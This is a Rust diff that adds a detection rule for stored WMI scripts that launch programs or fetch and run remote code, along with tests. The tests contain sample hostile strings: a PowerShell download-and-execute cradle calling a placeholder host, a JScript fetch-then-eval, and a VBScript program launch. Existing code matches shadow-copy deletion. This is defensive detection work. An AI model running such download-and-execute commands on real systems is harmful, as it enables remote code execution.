@@ -546,6 +546,29 @@ pub fn judge_launch(launch: &Launch<'_>) -> Option<RuleHit> {
     None
 }
 
+/// Judges script text kept somewhere to run later, such as a WMI `ActiveScriptEventConsumer`:
+/// PowerShell that downloads and runs or loads code into memory, and VBScript or JScript that
+/// starts programs or fetches from the web. The text is lower case.
+pub fn judge_script(text: &str) -> Option<RuleHit> {
+    if let Some(hit) = judge_powershell(text) {
+        return Some(hit);
+    }
+    let starts_programs =
+        text.contains("wscript.shell") && (text.contains(".run") || text.contains(".exec"));
+    let fetches = [
+        "msxml2.xmlhttp",
+        "winhttp.winhttprequest",
+        "msxml2.serverxmlhttp",
+    ]
+    .iter()
+    .any(|object| text.contains(object));
+    let writes_or_runs = text.contains("adodb.stream") || text.contains("eval(") || starts_programs;
+    if starts_programs || (fetches && writes_or_runs) {
+        return Some(REMOTE_SCRIPT);
+    }
+    None
+}
+
 fn judge_powershell(text: &str) -> Option<RuleHit> {
     if text.contains("win32_shadowcopy") && (text.contains("delete") || text.contains("remove-")) {
         return Some(SHADOW_COPY_DELETION);
@@ -965,6 +988,23 @@ mod tests {
         );
         assert!(judge_autostart("\"C:\\Program Files\\App\\app.exe\" /background").is_none());
         assert!(judge_autostart("C:\\Windows\\System32\\SecurityHealthSystray.exe").is_none());
+    }
+
+    #[test]
+    fn stored_scripts_that_start_programs_or_fetch_and_run_are_condemned() {
+        assert!(judge_script(
+            "set s = createobject(\"wscript.shell\") : s.run \"c:\\users\\x\\a.exe\""
+        )
+        .is_some());
+        assert!(judge_script(
+            "var x = new activexobject('msxml2.xmlhttp'); x.open('get', u); eval(x.responsetext)"
+        )
+        .is_some());
+        assert!(
+            judge_script("iex (new-object net.webclient).downloadstring('https://a.test')")
+                .is_some()
+        );
+        assert!(judge_script("wscript.echo \"hello\"").is_none());
     }
 
     #[test]
